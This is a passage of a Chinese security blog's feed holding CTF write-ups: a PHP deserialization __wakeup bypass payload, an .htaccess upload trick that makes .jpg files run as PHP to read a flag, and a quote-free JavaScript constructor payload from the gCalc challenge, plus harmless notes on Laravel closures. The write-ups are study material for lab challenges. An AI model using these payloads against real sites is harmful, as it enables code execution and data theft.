class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br><span class="line">修改后 payload。注意对象属性数被修改为 <span class="number">3</span>，比实际对象属性数大</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure><p>payload打上去即显示 flag</p><br><h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p>参考:</p><p><a href="https://book.hacktricks.xyz/pentesting-web/file-upload">https://book.hacktricks.xyz/pentesting-web/file-upload</a></p><br><p>这道题只要上传文件名为 .php* .phtml* 都会被拦截。</p><p>另辟蹊径，上传 .htaccess 进行绕过。.htaccess 内容为 <u>当前目录下所有 .jpg 后缀文件都以 php 进行解析</u></p><p><em>.htaccess</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files *.jpg&gt;</span><br><span class="line">ForceType application/x-httpd-php</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure><br><p>上传成功后再传个普通的 php一句话即可，查看 <code>phpinfo()</code>。</p><p>disable_functions:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld</span><br></pre></td></tr></table></figure><br><p>由于只是 get flag。那就不 getshell了。 bypass disable_function 过几天本地搭建研究下（挖一坑）。直接使用 php 内置的扫目录和读文件命令 <code>scandir</code> 和 <code>file_get_contents</code> 来进行读 flag 操作</p><br><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[扫目录]</span><br><span class="line">var_dump(scandir(<span class="string">&quot;../../../../../../&quot;</span>));</span><br><span class="line"></span><br><span class="line">[OUTPUT:]</span><br><span class="line">...</span><br><span class="line">flag</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">=============</span><br><span class="line">[读flag]</span><br><span class="line">var_dump(file_get_contents(<span class="string">&quot;../../../../../../flag&quot;</span>));</span><br><span class="line"></span><br><span class="line">[OUTPUT:]</span><br><span class="line">...</span><br><span class="line">flag&#123;xxxxxxx&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;周末玩了玩CTF，做个小记录&lt;/p&gt;
&lt;p&gt;平台地址：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://buuoj.cn/&quot;&gt;https://buuoj.cn/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="WEB" scheme="http://example.com/categories/CTF/WEB/"/>
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Javascript constructor 相关小知识分享</title>
    <link href="http://example.com/2021/03/11/2021-03-11-javascript-constructor/"/>
    <id>http://example.com/2021/03/11/2021-03-11-javascript-constructor/</id>
    <published>2021-03-11T07:57:35.000Z</published>
    <updated>2021-03-11T13:55:52.879Z</updated>
    
    <content type="html"><![CDATA[<p>看了 Orange大佬的 “<a href="http://blog.orange.tw/2018/06/google-ctf-2018-quals-web-gcalc.html">Google CTF 2018 Quals Web Challenge - gCalc</a>” 一文。发现了许多有趣的小技巧小知识。这里简单写一写关于这些小知识的理解。</p><span id="more"></span><br><h1 id="分析正则表达式"><a href="#分析正则表达式" class="headerlink" title="分析正则表达式"></a>分析正则表达式</h1><p>原文中提到了一个在线正则表达式平台，使用了下确实好用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;^(?:[\(\)\*\&#x2F;\+%\-0-9 ]|\bvars\b|[.]\w+)*$&#x2F;</span><br></pre></td></tr></table></figure><p><strong>这个正则表达式主要内容可以分为 三部分，注意各个部分是使用 | 进行分割:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?:[\(\)\*\&#x2F;\+%\-0-9 ]</span><br></pre></td></tr></table></figure><p>扩展解释下正则表达式</p><p>A|B     为或，匹配捕获 A 或者 B</p><p>A(?=B) 匹配时 AB 需要连着。捕获时只返回A</p><p>A(?!B)  匹配时 AB 不能连着。捕获时只返回A</p><p>A(?:B)  匹配时 AB 需要连着。但是不捕获。仅匹配。一般配合 | 使用。可以理解为 可有可无</p><img src="/2021/03/11/2021-03-11-javascript-constructor/1.png" style="width:200px;"><br><img src="/2021/03/11/2021-03-11-javascript-constructor/2.png" style="width:200px;"><p>这一段正则表达式的意思为，仅匹配 <code>( ) * / + % - 0-9 空格</code> 这些字符</p><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\bvars\b</span><br></pre></td></tr></table></figure><p>\b 匹配一个单词边界，不过好像不太重要</p><p>这一段正则表达式的意思为，待匹配字符串必须存在 <code>vars</code> 这一个字符串</p><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[.]\w+</span><br></pre></td></tr></table></figure><p>这一段正则表达式的意思为，匹配 <code>.</code> 和各个单词字符</p><p>regex101 有 Debugger 模式，可以输入以下字符串进行匹配，更易理解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(vars).toString()</span><br></pre></td></tr></table></figure><br><h1 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h1><p><em>Object</em> 都带有一个 <em>constructor</em>，<em>用于返回创建实例对象的构造函数的引用</em>。</p><p>不同类型会不一样。即什么类型的 <em>constructor</em> 将会返回什么类型的实例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x1 = <span class="number">1</span></span><br><span class="line">x1.constructor</span><br><span class="line">[OUTPUT:] ƒ <span class="function"><span class="title">Number</span>(<span class="params"></span>)</span> &#123; [native code] &#125;</span><br><span class="line"></span><br><span class="line">x1.toString().constructor</span><br><span class="line">[OUTPUT:] ƒ <span class="function"><span class="title">String</span>(<span class="params"></span>)</span> &#123; [native code] &#125;</span><br></pre></td></tr></table></figure><p>基本使用看<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/constructor">官方文档</a>就好了。</p><br><p><strong>重点说下有意思的地方。</strong></p><p>如果调用 <strong>一层</strong> <em>constructor</em>。则这个构造函数是 对应类型 的构造函数。只能输入指定类型</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x1 = <span class="number">1</span></span><br><span class="line">x1.constructor(<span class="number">33</span>)</span><br><span class="line">[OUTPUT:] <span class="number">33</span></span><br><span class="line"></span><br><span class="line">x1.constructor(<span class="string">&quot;aa&quot;</span>)</span><br><span class="line">[OUTPUT:] <span class="literal">NaN</span></span><br></pre></td></tr></table></figure><p>但是如果调用 <strong>多层</strong> <em>constructor</em>. 则多层构造函数返回一个匿名函数。函数体内容为输入的参数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x.constructor.constructor(<span class="string">&quot;alert(1)&quot;</span>)</span><br><span class="line">[OUTPUT:] </span><br><span class="line">ƒ anonymous(</span><br><span class="line">) &#123;</span><br><span class="line">alert(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要想实现调用，在末尾添加一对 <code>()</code> 即可。这是 js 调用函数的格式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x.constructor.constructor(<span class="string">&quot;alert(1)&quot;</span>)()</span><br></pre></td></tr></table></figure><p>在 writeup 中，由于无法传入单双引号。所以第一个 <em>Payload</em> 只能使用 <code>fromCharCode()</code> 的方式获取字符串</p><br><h1 id="Javascript-无引号利用"><a href="#Javascript-无引号利用" class="headerlink" title="Javascript 无引号利用"></a>Javascript 无引号利用</h1><p>文章中最终的 payload 为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>).constructor.constructor(<span class="regexp">/1/</span>.exec(<span class="number">1</span>).keys(<span class="number">1</span>).constructor.keys(vars).pop())</span><br></pre></td></tr></table></figure><p>首先需要理解，最终的 payload 是需要获取 <code>vars</code> 的索引值来 alert。</p><p>Javascript Object 中有个名为 <em>keys</em> 的方法。<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/keys">官网</a>中有例子。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;<span class="string">&quot;alert(1)&quot;</span>:<span class="number">0</span>&#125;</span><br><span class="line">(<span class="built_in">Object</span>).keys(payload)</span><br><span class="line">[OUTPUT:] [<span class="string">&quot;alert(1)&quot;</span>]</span><br></pre></td></tr></table></figure><p>再结合 Array 的 pop 方法。我们就可以获取索引值了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;<span class="string">&quot;alert(1)&quot;</span>:<span class="number">0</span>&#125;</span><br><span class="line">(<span class="built_in">Object</span>).keys(payload).pop()</span><br><span class="line">[OUTPUT:] <span class="string">&quot;alert(1)&quot;</span></span><br></pre></td></tr></table></figure><br><p>原 payload 是先使用正则表达式来获取 Object，然后才能获取索引值。我们来分析下</p><p>这一段使用正则表达式获取一个 Object </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/<span class="number">1</span>/.exec(<span class="number">1</span>)</span><br><span class="line">[OUTPUT:]</span><br><span class="line"><span class="number">0</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">groups: <span class="literal">undefined</span></span><br><span class="line">index: <span class="number">0</span></span><br><span class="line">input: <span class="string">&quot;1&quot;</span></span><br><span class="line">length: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>通过 Object keys 方法获取到数组迭代器。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/<span class="number">1</span>/.exec(<span class="number">1</span>).keys(<span class="number">1</span>)</span><br><span class="line">[OUTPUT:] <span class="built_in">Array</span> Iterator &#123;&#125;</span><br></pre></td></tr></table></figure><p>有了数组迭代器，就可以快乐的使用 keys 和 pop 获取索引值了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="number">1</span>/.exec(<span class="number">1</span>).keys(<span class="number">1</span>).constructor.keys(payload).pop()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;看了 Orange大佬的 “&lt;a href=&quot;http://blog.orange.tw/2018/06/google-ctf-2018-quals-web-gcalc.html&quot;&gt;Google CTF 2018 Quals Web Challenge - gCalc&lt;/a&gt;” 一文。发现了许多有趣的小技巧小知识。这里简单写一写关于这些小知识的理解。&lt;/p&gt;</summary>
    
    
    
    <category term="Javascript" scheme="http://example.com/categories/Javascript/"/>
    
    
    <category term="Javascript" scheme="http://example.com/tags/Javascript/"/>
    
    <category term="正则表达式" scheme="http://example.com/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP闭包在类中的小笔记</title>
    <link href="http://example.com/2021/03/03/2021-03-03-Closure-inClass/"/>
    <id>http://example.com/2021/03/03/2021-03-03-Closure-inClass/</id>
    <published>2021-03-03T07:39:18.000Z</published>
    <updated>2021-03-15T15:35:37.783Z</updated>
    
    <content type="html"><![CDATA[<br><p>在翻看 Laravel 源码时，发现其进行服务注册的时候，大量使用了诸如这样的格式:</p><span id="more"></span><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//服务类父类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Service</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$app</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//所有服务类的构造方法</span></span><br><span class="line"><span class="comment">//$app 用于存放 容器类 的实例</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$app</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;app = <span class="variable">$app</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//服务类A</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ServiceA</span> <span class="keyword">extends</span> <span class="title">Service</span></span>&#123;</span><br><span class="line">    <span class="comment">//注册方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;app-&gt;singleton(<span class="built_in">self</span>::class, <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$app</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Some action in this Closure ......&#x27;</span>;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//服务类B</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ServiceB</span> <span class="keyword">extends</span> <span class="title">Service</span></span>&#123;</span><br><span class="line">    <span class="comment">//注册方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;app-&gt;singleton(<span class="built_in">self</span>::class, <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$app</span></span>) <span class="title">use</span>(<span class="params"><span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Some action in this Closure ......&#x27;</span>;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//容器类</span></span><br><span class="line"><span class="comment">//$bindings 存放各个服务类的实例</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Container</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$bindings</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">singleton</span>(<span class="params"><span class="variable">$abstract</span>, <span class="variable">$concrete</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//注册各个服务类</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;bindings[<span class="variable">$abstract</span>] = <span class="variable">$concrete</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//入口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//容器类</span></span><br><span class="line"><span class="variable">$Container</span> = <span class="keyword">new</span> Container();</span><br><span class="line"><span class="variable">$ServiceA</span> = <span class="keyword">new</span> ServiceA(<span class="variable">$Container</span>);</span><br><span class="line"><span class="variable">$ServiceB</span> = <span class="keyword">new</span> ServiceB(<span class="variable">$Container</span>);</span><br><span class="line">        <span class="comment">//注册服务</span></span><br><span class="line"><span class="variable">$ServiceA</span>-&gt;register();</span><br><span class="line">        <span class="variable">$ServiceB</span>-&gt;register([</span><br><span class="line">        <span class="string">&#x27;arg1&#x27;</span> =&gt; <span class="string">&#x27;value1&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Index</span> = <span class="keyword">new</span> Index();</span><br></pre></td></tr></table></figure><br><p>以上代码中，<em>Index</em>类为入口，将服务类 <em>ServiceA</em> 和 <em>ServiceB</em> 的实例存放于 容器类 <em>Container</em> 中</p><p>这里值得注意的是，服务类在调用容器类 <em>Container</em> 的注册方法 <em>singleton</em> 时，第一个参数是注册的名字，第二个参数是一个匿名函数。</p><p>这样子操作，在容器类 <em>Container</em> 的 注册方法 <em>singleton</em> 中，<code>$concrete</code> 的值到底是什么呢？匿名函数的 <em>Closure</em> 实例吗？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="comment">//服务类A</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ServiceA</span> <span class="keyword">extends</span> <span class="title">Service</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;app-&gt;singleton(<span class="built_in">self</span>::class, <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$app</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Some action in this Closure ......&#x27;</span>;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//容器类</span></span><br><span class="line"><span class="comment">//$bindings 存放各个服务类的实例</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Container</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$bindings</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">singleton</span>(<span class="params"><span class="variable">$abstract</span>, <span class="variable">$concrete</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//注册各个服务类</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;bindings[<span class="variable">$abstract</span>] = <span class="variable">$concrete</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><br><p>通过 <em>Debuger</em> 可以看到，<code>$concrete</code> 传入的确实是一个 <code>Closure</code>类，只不过这个类里头包含两个成员:<code>$this</code> 和 <code>parameter</code>。其中 <code>$this</code> 的值为 <strong>调用类</strong> 的 <em>$this</em>。而 <code>parameter</code> 里头的值为 <em>闭包</em> 的 形参。如果使用了 <em>use</em> 语句，还会多一个 <em>static</em> 字段，用于存放 <em>use</em> 的变量</p><img src="/2021/03/03/2021-03-03-Closure-inClass/1.png" style="width:500px"><p>那传入<em>闭包</em> 给 <code>$bindings</code> 有什么作用呢？可能这是一种设计模式吧。。还没怎么了解。。。Laravel 之后的代码中也确实通过类似下面的方式进行了调用。个人认为这样子相当于为服务类新增多一个单独的方法吧。可以这样子调用:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Container</span>-&gt;bindings[ServiceA::class](<span class="string">&quot;xxxx&quot;</span>);</span><br></pre></td></tr></table></figure><p>更多高级点的知识参考下这篇文章</p><p><a href="https://www.cnblogs.com/echojson/p/10957362.html">https://www.cnblogs.com/echojson/p/10957362.html</a></p><br><h1 id="在-Laravel-中的相关操作"><a href="#在-Laravel-中的相关操作" class="headerlink" title="在 Laravel 中的相关操作"></a>在 Laravel 中的相关操作</h1><p><em>Laravel</em> 中，有个叫 <em>Container</em> 的类，用于存放各个实例化的类，方便随时调用。</p><h2 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h2><p>为了将各个类注册进 <em>Container</em> 中，<em>Container</em>类有一个名为 <em>bind</em> 的方法专门用于将实例化的类存入 <em>bindings</em> 成员变量中。这些实例化的类有很多都是带着匿名函数的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 通过 Container 注册一个 binding</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string  $abstract</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  \Closure|string|null  $concrete</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  bool  $shared</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bind</span>(<span class="params"><span class="variable">$abstract</span>, <span class="variable">$concrete</span> = <span class="literal">null</span>, <span class="variable">$shared</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">//如果传进来的实例不是一个匿名函数</span></span><br><span class="line">    <span class="comment">//将会通过 $this-&gt;getClosure</span></span><br><span class="line">    <span class="comment">//强行给实例添加一个匿名函数</span></span><br><span class="line">    <span class="comment">//不过由于添加匿名函数时，$this 是 Container 类</span></span><br><span class="line">    <span class="comment">//所以需要给 getClosure() 传入 $concrete。确保原来的类实例存在</span></span><br><span class="line">    <span class="keyword">if</span> (! <span class="variable">$concrete</span> <span class="keyword">instanceof</span> <span class="built_in">Closure</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (! is_string(<span class="variable">$concrete</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">TypeError</span>(<span class="built_in">self</span>::class.<span class="string">&#x27;::bind(): Argument #2 ($concrete) must be of type Closure|string|null&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//!!!!</span></span><br><span class="line">        <span class="variable">$concrete</span> = <span class="keyword">$this</span>-&gt;getClosure(<span class="variable">$abstract</span>, <span class="variable">$concrete</span>);</span><br><span class="line">        <span class="comment">//!!!!</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//注册实例</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;bindings[<span class="variable">$abstract</span>] = compact(<span class="string">&#x27;concrete&#x27;</span>, <span class="string">&#x27;shared&#x27;</span>);</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h2><p>调用已注册的 <em>binding</em>  使用的是 <em>Container</em>类 的 <em>build()</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">build</span>(<span class="params"><span class="variable">$concrete</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//如果传入的实例是匿名函数</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$concrete</span> <span class="keyword">instanceof</span> <span class="built_in">Closure</span>) &#123;</span><br><span class="line">        <span class="comment">//直接使用 变量() 的方式进行调用</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$concrete</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;getLastParameterOverride());</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;br&gt;

&lt;p&gt;在翻看 Laravel 源码时，发现其进行服务注册的时候，大量使用了诸如这样的格式:&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="http://example.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>tp3.x sql注入复现</title>
    <link href="http://example.com/2021/03/01/2021-02-28-tp3-x-sql/"/>
    <id>http://example.com/2021/03/01/2021-02-28-tp3-x-sql/</id>
    <published>2021-03-01T15:41:00.000Z</published>
    <updated>2021-04-23T05:57:20.805Z</updated>
    
